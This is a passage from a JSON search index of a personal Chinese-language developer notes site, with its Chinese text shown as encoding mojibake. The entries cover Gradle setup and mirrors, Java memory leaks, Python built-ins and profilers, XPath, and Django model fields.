fun()","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-question-Function-parameter-VOID.html","loc":"/yq-doc-source-docs-rear-end-from-question-Function-parameter-VOID.html"},{"title":"Windowsä¸‹é•¿è·¯å¾„åˆ é™¤/é‡å‘½å","text":"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-question-Long--distance-operation.html","loc":"/yq-doc-source-docs-rear-end-from-question-Long--distance-operation.html"},{"title":"é—®é¢˜-C","text":"æšä¸¾ç±»å‹ å‡½æ•°å‚æ•°void ç¼–è¾‘å™¨é•¿å­—ç¬¦ä¸²å¤šè¡Œå†™ å…³äºåº“çš„æŠ¥é”™ é•¿è·¯å¾„æ“ä½œ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-question-index.html","loc":"/yq-doc-source-docs-rear-end-from-question-index.html"},{"title":"å®‰å“å¼€å‘","text":"ç›¸å…³æ•™ç¨‹å¯å‚è€ƒw3schoolçš„: https://www.w3cschool.cn/uawnhh/qbe84ozt.html èµ„æºæ–‡ä»¶ä»‹ç»","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Android-development-index.html","loc":"/yq-doc-source-docs-rear-end-java-Android-development-index.html"},{"title":"æ„å»ºå·¥å…·","text":"æ„å»ºå·¥å…·","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Build-tools.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools.html"},{"title":"Gradle","text":"å®˜ç½‘: https://gradle.org é‡è¦ ç›®å‰ä¸ºæ­¢, æ­¤æ–‡æ¡£ç¼–å†™æ—¶, ä½¿ç”¨ç‰ˆæœ¬ä¸º Gradle-8.1.1 å®‰è£… Macå¯ä»¥ç›´æ¥ä½¿ç”¨homebrew: brew install gradle å®‰è£…ä¼šä¸‹è½½å¾ˆå¤šä¾èµ–åŒ…, ä¸æ‡‚Macä¸ºå•¥è¦ä¸‹è½½è¿™ä¹ˆå¤šä¾èµ–åŒ…, æˆ‘çš„å®‰è£…è·¯å¾„æ˜¯åœ¨: /usr/local/Cellar/gradle/8.1.1 å¯èƒ½ä¼šæœ‰éœ€è¦å®‰è£…Java, å¯å‚è€ƒ /docs/åç«¯/java/å®‰è£… ç„¶ååœ¨Android Studioé‡Œé¢è‡ªå®šä¹‰Gradleè·¯å¾„çš„æ—¶å€™ä¸çŸ¥é“ä¸ºå•¥å°±ç›´æ¥æ˜¯: /usr/local/Cellar/gradle/8.1.1/libexec Android Studioä¸­è®¾ç½®ä½ç½® æ‰€æœ‰ç‰ˆæœ¬: https://gradle.org/releases/ è‹¥éœ€è¦è®¾ç½®Gradleä»“åº“çš„ç¯å¢ƒå˜é‡, è®¾ç½®: export GRADLE_USER_HOME=... æ³¨è§£ è‹¥ä¸‹è½½çš„æ˜¯è§£å‹åŒ…, éœ€è¦æ‰‹åŠ¨è§£å‹åˆ°ç›¸å…³ä½ç½®, å¦‚: $ mkdir /opt/gradle $ unzip -d /opt/gradle gradle-8.1.1-bin.zip $ ls /opt/gradle/gradle-8.1.1 LICENSE NOTICE bin getting-started.html init.d lib media è­¦å‘Š è‹¥ä½¿ç”¨Mac brewå®‰è£…, éœ€è¦æå‰é…ç½®å¥½JAVAç¯å¢ƒ, å¯å‚è€ƒ /docs/åç«¯/java/å®‰è£… , è‹¥æ˜¯åé…ç½®å¥½JAVA, éœ€è¦å…ˆbrewå¸è½½åå†è£…. (æœ€ä¸»è¦çš„å°±æ˜¯è·Ÿç³»ç»Ÿçš„ /usr/bin/java å¯¹åº”èµ·æ¥, å¦åˆ™å³ä½¿é…ç½®çš„æ­£ç¡®çš„JAVA_HOME, ä¹Ÿä¼šæœ‰é—®é¢˜) æ‰€ä»¥æˆ‘é€‰æ‹©è§£å‹åŒ…æ–¹ä¾¿. é…ç½®ç³»ç»Ÿç¯å¢ƒ Linux/Mac, ä»¥å®‰è£…åˆ° /opt/gradle/gradle-8.1.1 ä¸ºä¾‹: # GRADLE_HOME å®˜ç½‘å®‰è£…æ–‡æ¡£å¹¶æœªè¦æ±‚è®¾ç½® GRADLE_HOME=/opt/gradle/gradle-8.1.1 export PATH=$PATH:$GRADLE_HOME/bin Windowsç›´æ¥åœ¨PATHç¯å¢ƒå˜é‡æ–°å¢ä¸€ä¸ªå³å¯. é…ç½®é•œåƒæº æœ‰ä¸¤ç§é€‰æ‹© .gradle ç›®å½•é€šå¸¸è¢«è®¾ç½®ä¸ºç¯å¢ƒå˜é‡ GRADLE_USER_HOME å…¨å±€é…ç½®, ç”¨æˆ·ç›®å½•ä¸‹æ–°å»º .gradle ç›®å½•, é¡¹ç›®é…ç½®, åœ¨é¡¹ç›®ä¸‹çš„ settings.gradle å¢åŠ æºåœ°å€: pluginManagement { repositories { maven { url 'https://maven.aliyun.com/repository/public/' } maven { url 'https://maven.aliyun.com/repository/google/' } maven { url 'https://maven.aliyun.com/repository/jcenter/' } maven { url 'https://maven.aliyun.com/repository/central/' } google() mavenCentral() gradlePluginPortal() } } dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS) repositories { maven { url 'https://maven.aliyun.com/repository/public/' } maven { url 'https://maven.aliyun.com/repository/google/' } maven { url 'https://maven.aliyun.com/repository/jcenter/' } maven { url 'https://maven.aliyun.com/repository/central/' } google() mavenCentral() } } rootProject.name = \"hello\" include ':app' è¯¦ç»†è¯´æ˜/ä»‹ç» gradle","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle.html"},{"title":"Gradle","text":"é…ç½®æ–‡ä»¶è¯´æ˜ ç›¸å…³ç¯å¢ƒå˜é‡è¯´æ˜ Gradleé¡¹ç›®åˆå§‹åŒ–ä¸‹è½½æ…¢ Android-Gradleé¡¹ç›®åˆå§‹åŒ–æ„å»ºæ—¶, ä¸‹è½½ gradle-7.5-bin.zip æ…¢çš„é—®é¢˜ ä¿®æ”¹ gradle-wrapper.properties æ–‡ä»¶, æˆ‘çš„åœ¨ gradle/wrapper/gradle-wrapper.properties , æ‰¾ä¸åˆ°å°±å…¨å±€æœä¸€ä¸‹, å°†åŸæœ¬çš„: distributionUrl=https\\://services.gradle.org/distributions/gradle-7.5-bin.zip æ›´æ”¹ä¸ºé•œåƒä»£ç†åœ°å€è·¯å¾„(è¿™é‡Œç”¨çš„è…¾è®¯çš„): distributionUrl=https\\://mirrors.cloud.tencent.com/gradle/gradle-7.5-bin.zip å…·ä½“ä½ç½®å¯ä»¥è¿›å»è…¾è®¯ä»£ç†åœ°å€è‡ªå·±æ‰¾æ‰¾: https://mirrors.cloud.tencent.com/ ä¿®æ”¹å","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-index.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-Gradle-index.html"},{"title":"æ„å»ºå·¥å…·","text":"gradle maven","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Build-tools-index.html","loc":"/yq-doc-source-docs-rear-end-java-Build-tools-index.html"},{"title":"Java","text":"å®‰è£… ç¼–è¯‘æ‰§è¡Œ æ„å»ºå·¥å…· ä¸€äº›å¤‡å¿˜ IDEAé…ç½®Gradleé¡¹ç›® IOæ¨¡å‹ DDD å®‰å“å¼€å‘ å®‰å“å¼€å‘ å†…å­˜æ³„æ¼ä¸å†…å­˜æº¢å‡º å†…å­˜æº¢å‡º JVMå†…å­˜æœ‰é™ã€‚å¦‚æœå¯¹è±¡å¤ªå¤šï¼ŒJVMå†…å­˜æ”¾ä¸ä¸‹äº†ï¼Œå°±ä¼šå†…å­˜æº¢å‡ºã€‚ å†…å­˜æ³„æ¼ JVMçš„åƒåœ¾å›æ”¶åªä¼šå›é¦–å¼•ç”¨è®¡æ•°ä¸º0çš„å¯¹è±¡, å¦‚æœå­˜åœ¨å¾ªç¯å¼•ç”¨, æˆ–è€…æ²¡æœ‰åŠæ—¶å›æ”¶è°ƒç”¨, å°±ä¼šä¸€ç›´å­˜åœ¨ å¦‚ä¸‹ä»£ç ä¸­ï¼Œobjçš„å€¼æ˜¯nullï¼Œå› æ­¤æ˜¯\"æ— ç”¨çš„\"ï¼› ä½†åŒæ—¶objåˆåŒæ—¶è¢«è¢«listå¼•ç”¨ï¼Œå› æ­¤æ˜¯\"å¯è¾¾\"çš„ï¼Œæ‰€ä»¥æ­¤æ—¶çš„objå°±ä¼šé€ æˆå†…å­˜æ³„æ¼ã€‚: Object obj = new Object(); list.add( obj ); obj = null ; é™¤äº†ä¸Šé¢objè¿™ç§å†…å­˜æ³„æ¼çš„æƒ…å†µä»¥å¤–ï¼Œ åœ¨å®é™…å¼€å‘ä¸­æœ€å¸¸è§çš„å†…å­˜æ³„æ¼å°±æ˜¯æ‰“å¼€èµ„æºåæ²¡æœ‰è°ƒç”¨close()æ–¹æ³•ã€‚ ä¾‹å¦‚socketã€ioæµç­‰ï¼Œéƒ½éœ€è¦å†æœ€åclose()ä¸€ä¸‹é˜²æ­¢å†…å­˜æ³„æ¼ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-index.html","loc":"/yq-doc-source-docs-rear-end-java-index.html"},{"title":"å†…ç½®å‡½æ•°","text":"__import__ __init__ __str__ any async_for bytearray chr cmp dict divmod enumerate filter format getattr isinstance iter list locals map max min open ord print round set slice sorted str,repr str type vars with zip pow","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-index.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-index.html"},{"title":"Pythonä¸€äº›å†…ç½®å‡½æ•°/å±æ€§","text":"__file__ ä¸€èˆ¬æ˜¯Pythonç¼–ç æ¨¡å—ä½¿ç”¨, è¡¨ç¤ºæ¨¡å—æ‰€åœ¨è·¯å¾„, å¦‚è·å–jsonæ¨¡å—æ‰€åœ¨è·¯å¾„: >>> import json >>> >>> json.__file__ '/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/json/__init__.py' >>> dir() exec() å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ‰§è¡Œ eval() å°†å­—ç¬¦ä¸²ä½œä¸ºè¡¨è¾¾å¼æ‰§è¡Œ,å¹¶è¿”å›ç»“æœã€‚ ä»…èƒ½æ‰§è¡Œå•ä¸ªè¡¨è¾¾å¼,ä¸èƒ½ä¸ºå˜é‡èµ‹å€¼ã€‚ å­—ç¬¦ä¸²å¿…é¡»æ˜¯åˆæ³•çš„Pythonè¡¨è¾¾å¼,å¦åˆ™ä¼šå¼•å‘SyntaxErrorã€‚ å…¶ä»–å†…ç½®å‡½æ•° ../å†…ç½®å‡½æ•°","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Some-built--in-functions-or-attributes.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Some-built--in-functions-or-attributes.html"},{"title":"æ¦‚å¿µç›¸å…³","text":"Pythonä¸­è¿›åˆ¶ Pythonçš„ç¼–ç  Pythonçº¿ç¨‹æ± åŠå…¶åŸç† objectç±» pythonå¯¼å…¥è¯´æ˜ pythonè™šæ‹Ÿç¯å¢ƒ pythonå‘½ä»¤é€‰é¡¹ä¸å‚æ•° åŒ…,æ¨¡å—ç»“æ„ å¯¹superçš„ç†è§£ å…ƒç±» åç¨‹ è¿­ä»£ å¤šçº¿ç¨‹-çº¿ç¨‹æ±  å¤šçº¿ç¨‹ å¤šè¿›ç¨‹ è£…é¥°å™¨ å­—å…¸æ“ä½œ ç‰¹æ®Šå­—ç¬¦ è¿›ç¨‹ä¸çº¿ç¨‹ ä¸€äº›ä½¿ç”¨æŠ€å·§,è¯´æ˜ å­—ç¬¦ä¸²å‰é¢åŠ u,r,bçš„å«ä¹‰ ä¸€äº›å†…ç½®å‡½æ•°æˆ–å±æ€§","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-index.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-index.html"},{"title":"Pythonæ€§èƒ½åˆ†æ","text":"æŸ¥äº†ä¸€ä¸‹, ä¸»è¦çš„æœ‰ä»¥ä¸‹å‡ ç§ cProfile: Pythonæ ‡å‡†åº“ä¸­å†…ç½®çš„æ€§èƒ½åˆ†ææ¨¡å—ï¼Œéä¾µå…¥å¼. cProfileç”Ÿæˆçš„ç»“æœå¯ä»¥è¿›ä¸€æ­¥å¯¼å‡ºæˆç«ç„°å›¾ line_profiler: ä¸»è¦åšå‡½æ•°å†…æ¯è¡Œè¯­å¥çš„æ€§èƒ½åˆ†æï¼Œéœ€è¦ä¾µå…¥ä»£ç . å¦‚æœå·²ç»çŸ¥é“å“ªä¸ªå‡½æ•°æ˜¯ç“¶é¢ˆï¼Œéœ€è¦å¯¹å‡½æ•°è¿›ä¸€æ­¥åˆ†æï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ª. pyflame: åªèƒ½ç”Ÿæˆç«ç„°å›¾. pyinstrument: ä½¿ç”¨é‡‡æ ·æ–¹æ³•å¯¹å‡½æ•°çš„æ‰§è¡Œæ—¶é—´è¿›è¡Œè®°å½•ï¼Œå¼€é”€æ¯”cProfileè¦å°. cProfile pyflame","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Performance-analysis-index.html","loc":"/yq-doc-source-docs-rear-end-python-Performance-analysis-index.html"},{"title":"ç›¸å…³æŠ€æœ¯å®ç°","text":"OCRè¯†åˆ« è·å–winä¸‹ç®¡ç†å‘˜æƒé™ åˆ¤æ–­æ˜¯å¦ä¸ºç±»æ–¹æ³• åœ¨ä¸€ä¸ªPythonç¯å¢ƒä½¿ç”¨å¦ä¸€ä¸ªPythonç¯å¢ƒçš„åŒ…","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-index.html","loc":"/yq-doc-source-docs-rear-end-python-Related-technology-implementation-index.html"},{"title":"XPath æ•™ç¨‹","text":"å‚è€ƒ: èœé¸Ÿ-XPath XPath æ˜¯ä¸€é—¨åœ¨ XML æ–‡æ¡£ä¸­æŸ¥æ‰¾ä¿¡æ¯çš„è¯­è¨€ã€‚ åœ¨å­¦ä¹ ä¹‹å‰åº”è¯¥å…·å¤‡çš„çŸ¥è¯†ï¼š HTML / XHTML XML / XML Namespaces ä»€ä¹ˆæ˜¯ XPath ? XPath ä½¿ç”¨è·¯å¾„è¡¨è¾¾å¼åœ¨ XML æ–‡æ¡£ä¸­è¿›è¡Œå¯¼èˆª XPath ä½¿ç”¨è·¯å¾„è¡¨è¾¾å¼æ¥é€‰å– XML æ–‡æ¡£ä¸­çš„èŠ‚ç‚¹æˆ–è€…èŠ‚ç‚¹é›†ã€‚è¿™äº›è·¯å¾„è¡¨è¾¾å¼å’Œæˆ‘ä»¬åœ¨å¸¸è§„çš„ç”µè„‘æ–‡ä»¶ç³»ç»Ÿä¸­çœ‹åˆ°çš„è¡¨è¾¾å¼éå¸¸ç›¸ä¼¼ã€‚ Path åŒ…å«ä¸€ä¸ªæ ‡å‡†å‡½æ•°åº“ XPath å«æœ‰è¶…è¿‡ 100 ä¸ªå†…å»ºçš„å‡½æ•°ã€‚è¿™äº›å‡½æ•°ç”¨äºå­—ç¬¦ä¸²å€¼ã€æ•°å€¼ã€æ—¥æœŸå’Œæ—¶é—´æ¯”è¾ƒã€èŠ‚ç‚¹å’Œ QName å¤„ç†ã€åºåˆ—å¤„ç†ã€é€»è¾‘å€¼ç­‰ç­‰ã€‚ XPath æ˜¯ XSLT ä¸­çš„ä¸»è¦å…ƒç´  XPath æ˜¯ XSLT æ ‡å‡†ä¸­çš„ä¸»è¦å…ƒç´ ã€‚å¦‚æœæ²¡æœ‰ XPath æ–¹é¢çš„çŸ¥è¯†ï¼Œæ‚¨å°±æ— æ³•åˆ›å»º XSLT æ–‡æ¡£ã€‚ æ‚¨å¯ä»¥åœ¨æˆ‘ä»¬çš„ ã€ŠXSLT æ•™ç¨‹ã€‹ ä¸­é˜…è¯»æ›´å¤šçš„å†…å®¹ã€‚ XQuery å’Œ XPointer å‡æ„å»ºäº XPath è¡¨è¾¾å¼ä¹‹ä¸Šã€‚XQuery 1.0 å’Œ XPath 2.0 å…±äº«ç›¸åŒçš„æ•°æ®æ¨¡å‹ï¼Œå¹¶æ”¯æŒç›¸åŒçš„å‡½æ•°å’Œè¿ç®—ç¬¦ã€‚ æ‚¨å¯ä»¥åœ¨æˆ‘ä»¬çš„ ã€ŠXQuery æ•™ç¨‹ã€‹ ä¸­é˜…è¯»æ›´å¤šæœ‰å…³ XQuery çš„çŸ¥è¯†ã€‚ XPath æ˜¯ä¸€ä¸ª W3C æ ‡å‡† XPath äº 1999 å¹´ 11 æœˆ 16 æ—¥ æˆä¸º W3C æ ‡å‡†ã€‚ XPath è¢«è®¾è®¡ä¸ºä¾› XSLTã€XPointer ä»¥åŠå…¶ä»– XML è§£æè½¯ä»¶ä½¿ç”¨ã€‚ æ‚¨å¯ä»¥åœ¨æˆ‘ä»¬çš„ ã€ŠW3C æ•™ç¨‹ã€‹ ä¸­é˜…è¯»æ›´å¤šæœ‰å…³ XPath æ ‡å‡†çš„ä¿¡æ¯ã€‚ XPathèŠ‚ç‚¹ XPathè¯­æ³• XPathè½´ XPathè¿ç®—ç¬¦ å®ä¾‹ ç›¸å…³ XSLT XSLT æ˜¯é’ˆå¯¹ XML æ–‡ä»¶çš„æ ·å¼è¡¨è¯­è¨€ã€‚ é€šè¿‡ XSLTï¼Œæ‚¨å¯ä»¥æŠŠ XML æ–‡ä»¶è½¬æ¢ä¸ºå…¶ä»–çš„æ ¼å¼ï¼Œæ¯”å¦‚ XHTMLã€‚ å¦‚æœæ‚¨å¸Œæœ›å­¦ä¹ æ›´å¤šæœ‰å…³ XSLT çš„çŸ¥è¯†ï¼Œè¯·è®¿é—®æˆ‘ä»¬çš„ ã€ŠXSLT æ•™ç¨‹ã€‹ ã€‚ XQuery XQuery å’Œ XML æ•°æ®æŸ¥è¯¢æœ‰å…³ã€‚ XQuery è¢«è®¾è®¡ç”¨æ¥æŸ¥è¯¢ä»»ä½•å¯ä½œä¸º XML å½¢æ€å‘ˆç°çš„æ•°æ®ï¼ŒåŒ…æ‹¬æ•°æ®åº“ã€‚ å¦‚æœæ‚¨å¸Œæœ›å­¦ä¹ æ›´å¤šæœ‰å…³ XQuery çš„çŸ¥è¯†ï¼Œè¯·è®¿é—®æˆ‘ä»¬çš„ ã€ŠXQuery æ•™ç¨‹ã€‹ ã€‚ XLink å’Œ XPointer XML ä¸­çš„é“¾æ¥è¢«åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šXLink å’Œ XPointerã€‚ XLink å’Œ XPointer å®šä¹‰äº†åœ¨ XML æ–‡æ¡£ä¸­åˆ›å»ºè¶…çº§é“¾æ¥çš„æ ‡å‡†æ–¹æ³•ã€‚ å¦‚æœä½ å¸Œæœ›å­¦ä¹ æ›´å¤šæœ‰å…³ XLink å’Œ XPointer çš„çŸ¥è¯†ï¼Œè¯·è®¿é—®æˆ‘ä»¬çš„ ã€ŠXLink æ•™ç¨‹å’Œ XPointeræ•™ç¨‹ã€‹ ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-index.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-index.html"},{"title":"æ•™ç¨‹","text":"é«˜çº§python Pytest debugç‰ˆæœ¬pythonå®‰è£… å¤šä¸ªç›®å½•ä¸‹çš„ä¸‰æ–¹åŒ…æ•´åˆ ä»æºç å®‰è£… Pythonç½‘ç»œç¼–ç¨‹ GUIå¼€å‘ä¹‹QT åˆ©ç”¨åå°„å®ä¾‹å¯¹è±¡ ä½¿ç”¨pythonä¸‹è½½æ–‡ä»¶ è‡ªåˆ¶pipåŒ… ç”Ÿæˆéšæœºå­—ç¬¦ä¸² xpath","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-index.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-index.html"},{"title":"æ¨¡å‹æ¨¡å—module","text":"æ€»è§ˆ: module.objects.all() è·å–è¯¥å®ä¾‹çš„æ‰€æœ‰ä¿¡æ¯ module.objects.add() æ·»åŠ  module.objects.create() åˆ›å»º module.objects.get() module.objects.filter(**kargs) è¿‡æ»¤å™¨ è¿”å›åŒ…å«æŒ‡å®šå‚æ•°çš„QuerySet module.objects.exclude(**kargs) è¿”å›ä¸åŒ…å«æŒ‡å®šå‚æ•°çš„QuerySet module.objects.annotate() module.objects.order_by() æ’åº module.objects.annotate() module.objects.alias() æ¨¡å‹ç±» æ¨¡å‹å®šä¹‰ æ¯ä¸ªæ¨¡å‹éƒ½æ˜¯pythonçš„ä¸€ä¸ªç±»ï¼Œä¸”éœ€ç»§æ‰¿ django.db.models.Model ç±»ä¸‹æ¯ä¸ªå±æ€§éƒ½ç›¸å½“äºä¸€ä¸ªæ•°æ®åº“å­—æ®µ æ¯å½“æ–°å»ºä¸€ä¸ªæ¨¡å‹çš„æ—¶å€™ï¼Œéƒ½éœ€è¦åœ¨ setting.pyä¸‹çš„ INSTALL_APPS é…ç½®ï¼Œå¦‚ æ–°å»º app: python manage.py start myapp é…ç½®app: INSTALL_APPS = [ 'myapp' ] å°†å˜æ›´å¥½çš„å†…å®¹å†™å…¥æ•°æ®åº“: # æŸ¥æ‰¾æ‰€æœ‰å¯ç”¨çš„æ¨¡å‹ ä¸ºä»»æ„ä¸€ä¸ªåœ¨æ•°æ®åº“ä¸­ä¸å­˜åœ¨å¯¹åº”æ•°æ®è¡¨çš„æ¨¡å‹åˆ›å»ºè¿ç§»è„šæœ¬æ–‡ä»¶ python manage.py makemigrations # å°†å˜æ›´å†™å…¥æ•°æ®åº“ python manage.py migrate æ¨¡å‹ä¸­çš„å­—æ®µç±»å‹ https://docs.djangoproject.com/zh-hans/3.2/ref/models/fields/#model-field-types æ¨¡å‹ä¸­çš„å­—æ®µé€‰é¡¹, å…³äºç±»ä¸­çš„å­—æ®µ, æ¯ä¸ªå­—æ®µéƒ½åº”è¯¥æ˜¯ Field ç±»çš„å®ä¾‹ æ”¯æŒçš„Field å‚è€ƒ: Djangoæ¨¡å‹å­—æ®µ å­—æ®µé€‰é¡¹ï¼Œéƒ¨åˆ†è§£é‡Š max_length æŒ‡å®šè¯¥å­—æ®µé•¿åº¦ db_index Trueè¡¨ç¤ºå°†ä¸ºæ­¤å­—æ®µå»ºç´¢å¼• default è¯¥å­—æ®µçš„é»˜è®¤å€¼ ã€‚å¯ä»¥æ˜¯å¯è°ƒç”¨å¯¹è±¡ï¼Œä½†æ˜¯é»˜è®¤ä¸å¯å˜ primary_key ä¸ºTrueæ—¶ï¼Œè¡¨ç¤ºå°†è¯¥å­—æ®µè®¾ç½®ä¸ºä¸»é”®ã€‚åŒæ—¶è¡¨ç¤º null=False å’Œ unique=True , å¦‚æœè¯¥æ¨¡å‹ä¸­ä¸€ä¸ªä¸»é”®éƒ½æ²¡æœ‰è®¾ç½®ï¼Œé‚£ä¹ˆå°†ä¼šè‡ªåŠ¨æ·»åŠ ä¸€ä¸ªå­—æ®µæ¥è®¾ç½®ä¸»é”®ã€‚ ä¸»é”®å­—æ®µæ˜¯åªè¯»çš„ã€‚å¦‚æœæ”¹å˜äº†ç°æœ‰å¯¹è±¡çš„ä¸»é”®å€¼ï¼Œç„¶åå°†å…¶ä¿å­˜ï¼Œåˆ™ä¼šåœ¨æ—§å¯¹è±¡æ—è¾¹åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ã€‚ verbose_name è¯¥å­—æ®µçš„å«ä¹‰, å­—æ®µå¤‡æ³¨åï¼ˆç›¸å½“äºç»™ä»–ä¸€ä¸ªæ³¨é‡Šï¼‰ unique è®¾ç½®ä¸ºTrueï¼Œè¡¨ç¤ºå­—æ®µå¿…é¡»åœ¨æ•´ä¸ªè¡¨ä¸­ä¿æŒå€¼å”¯ä¸€ã€‚å±äºæ•°æ®åº“çº§åˆ«å’Œæ¨¡å‹éªŒè¯ä¸­å¼ºåˆ¶æ‰§è¡Œã€‚ unique_for_date å°†å…¶è®¾ç½®ä¸º DateField æˆ– DateTimeField çš„åç§°ï¼Œè¦æ±‚è¯¥å­—æ®µçš„æ—¥æœŸå­—æ®µå€¼æ˜¯å”¯ä¸€çš„ã€‚ unique_for_month ä¸ä¸Šä¸€ä¸ªä¸€è‡´ï¼ŒåŒºåˆ«ä¸ºè¦æ±‚æœˆä»½å”¯ä¸€ unique_for_year è¦æ±‚å¹´ä»½å”¯ä¸€ null å¦‚æœè®¾ç½®ä¸ºTrueï¼Œè¡¨ç¤ºå½“è¯¥å­—æ®µä¸ºç©ºæ—¶ï¼ŒDjangoä¼šå°†æ•°æ®åº“ä¸­è¯¥å­—æ®µè®¾ç½®ä¸ºNULLã€‚é»˜è®¤False blank é»˜è®¤Falseã€‚Trueè¡¨ç¤ºè¯¥å­—æ®µå…è®¸ä¸ºç©ºã€‚ ä¸nullçš„åŒºåˆ«æ˜¯ï¼Œnullä»…è¡¨ç¤ºæ•°æ®åº“å±‚é¢çš„ç©ºï¼Œè€Œ blankæ¶‰åŠè¡¨å•éªŒè¯ï¼Œä¸ºFlaseè¡¨ç¤ºè¡¨å•è¯¥å­—æ®µå¿…å¡« db_column å­—æ®µä½¿ç”¨çš„æ•°æ®åº“åˆ—åï¼ŒæœªæŒ‡å®šæ—¶ä½¿ç”¨æ•°æ®åº“å db_tablespace å¦‚æœè¿™ä¸ªå­—æ®µæœ‰ç´¢å¼•ï¼Œé‚£ä¹ˆè¦ä¸ºè¿™ä¸ªå­—æ®µçš„ç´¢å¼•ä½¿ç”¨çš„ æ•°æ®åº“è¡¨ç©ºé—´ çš„åç§°ã€‚ é»˜è®¤æ˜¯é¡¹ç›®çš„ DEFAULT_INDEX_TABLESPACE ï¼ˆå¦‚æœæœ‰è®¾ç½®ï¼‰,æˆ–è€…æ˜¯æ¨¡å‹çš„ db_tablespace ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚ å¦‚æœåç«¯ä¸æ”¯æŒç´¢å¼•çš„è¡¨ç©ºé—´ï¼Œåˆ™å¿½ç•¥æ­¤é€‰é¡¹ã€‚ è¿™é‡Œå…¶å®æ²¡ææ‡‚ä¸ºå•¥ç´¢å¼•ä¹Ÿæœ‰è¡¨ç©ºé—´ï¼Œæœäº†ä¸€ä¸‹æš‚æ—¶æ²¡å¾—åˆ°ç­”æ¡ˆ mysqlçš„è¡¨ç©ºé—´ä½¿ç”¨ editable é»˜è®¤ä¸ºTrueã€‚ Falseè¡¨ç¤ºè¯¥å­—æ®µä¸ä¼šåœ¨ç®¡ç†æˆ–è€…ä»»ä½•å…¶ä»–åœ°æ–¹ä¸­æ˜¾ç¤º error_messages è¦†ç›–è¯¥å­—æ®µå¼•å‘çš„é»˜è®¤æ¶ˆæ¯ã€‚ä¼ å…¥ä¸€ä¸ªä¸ä½ æƒ³è¦†ç›–çš„é”™è¯¯ä¿¡æ¯ç›¸åŒ¹é…çš„é”®å€¼çš„å­—å…¸ã€‚ è¿™é‡Œä¹Ÿæ²¡æ‡‚å•¥æ„æ€ -_- ï¼Œå¯å‚è€ƒ error_messages help_text é¢å¤–çš„å¸®åŠ©æ–‡æ¡£ï¼Œéšè¡¨å•æ§ä»¶ä¸€èµ·æ˜¾ç¤ºã€‚å³ä¾¿å­—æ®µæœªç”¨ä¸è¡¨å•ï¼Œå¯¹äºç”Ÿæˆæ–‡æ¡£ä¹Ÿå¯ç”¨ã€‚ è¿™ä¸ªä¹Ÿæ²¡æ‡‚ &#94;_&#94; validators è¦ä¸ºè¯¥å­—æ®µè¿è¡Œçš„éªŒè¯å™¨åˆ—è¡¨ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è§ éªŒè¯å™¨æ–‡æ¡£ è¿™ä¸ªæœ‰ç‚¹æ·±ï¼Œè¡¨ç¤ºè‡ªå®šä¹‰éªŒè¯æœºåˆ¶ choices ä¸€ç³»åˆ—äºŒå…ƒæ•°ç»„ï¼Œåœ¨è¡¨å•ä¸Šè¡¨ç¤ºä¸ºé€‰æ‹©æ¡† å¦‚ï¼Œä¸€ä¸ªé€‰é¡¹åˆ—è¡¨: from django.db import models class Person(models.Model): # ä¸€ä¸ªé€‰é¡¹åˆ—è¡¨ SHIRT_SIZES = ( ('S', 'Small'), ('M', 'Medium'), ('L', 'Large'), ) name = models.CharField(max_length=60) shirt_size = models.CharField(max_length=1, choices=SHIRT_SIZES) æ³¨æ„ï¼Œå½“choicesçš„é¡ºåºå˜åŠ¨æ—¶ï¼Œå°†åˆ›å»ºæ–°çš„è¿ç§» å½“ä»£ç åŒ…å«æ­¤å­—æ®µæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ get_å®šä¹‰å€¼_dispaly æ¥è·å–å“åº”çš„ç»“æœï¼Œå¦‚: >>> p = Person(name=\"Fred Flintstone\", shirt_size=\"L\") >>> p.save() >>> p.shirt_size 'L' >>> p.get_shirt_size_display() 'Large' through ä»…ç”¨äºå¤šå¯¹å¤šå­—æ®µä¸­, æŒ‡å®šä½¿ç”¨å“ªä¸ªæ¨¡å‹","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Module-Module.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Module-Module.html"},{"title":"Djangoæ”¯æŒçš„Field","text":"AutoField BigAutoField BigIntegerField BinaryField BooleanField CharField DateField DateTimeField DecimalField DurationField EmailField FieldFile FileField FilePathField FloatField GenericIPAddressField ImageField IntegerField JSONField NullBooleanField PositiveBigIntegerField PositiveIntegerField PositiveSmallIntegerField SlugField SmallAutoField SmallIntegerField TextField TimeField URLField 